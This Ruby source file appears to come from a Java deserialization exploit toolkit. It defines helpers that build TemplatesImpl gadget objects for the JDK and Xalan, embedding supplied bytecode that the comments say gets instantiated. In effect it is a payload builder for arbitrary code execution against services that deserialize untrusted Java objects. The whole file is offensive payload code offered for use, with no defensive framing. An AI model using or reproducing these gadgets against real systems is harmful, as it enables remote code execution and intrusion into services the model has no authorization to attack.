
require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module Templates
        # one of the passed bytecodes needs to be extending
        # com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
        # That class is the one that will be instantiated
        def make_jdk(bytecodes)
          tpl = JavaObject.new('Lcom/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl;', '_outputProperties' => JavaObject.new('Ljava/util/Properties;', {}),
                                                                                               '_name' => 'Translet',
                                                                                               '_bytecodes' => JavaArray.new('[B', bytecodes.map { |bytecode| JavaArray.new('B', bytecode[1].bytes.to_a) }))

          tpl
        end

        module_function :make_jdk

        def make_xalan(bytecodes)
          tpl = JavaObject.new('Lorg/apache/xalan/xsltc/trax/TemplatesImpl;', '_outputProperties' => JavaObject.new('Ljava/util/Properties;', {}),
                                                                              '_name' => 'Translet',
                                                                              '_bytecodes' => JavaArray.new('[B', bytecodes.map { |bytecode| JavaArray.new('B', bytecode[1].bytes.to_a) }))

          tpl
        end

        module_function :make_xalan

        def supported(ctx)
          if ctx.flag?('nojdktemplates') &&
             !ctx.class?('org.apache.xalan.xsltc.trax.TemplatesImpl')
            return false
          end
          true
        end
        module_function :supported

        def make(ctx, bytecodes)
          if ctx.flag?('nojdktemplates') &&
             ctx.class?('org.apache.xalan.xsltc.trax.TemplatesImpl')
            make_xalan(bytecodes)
          else
            make_jdk(bytecodes)
          end
        end
        module_function :make
        end
    end
  end
end
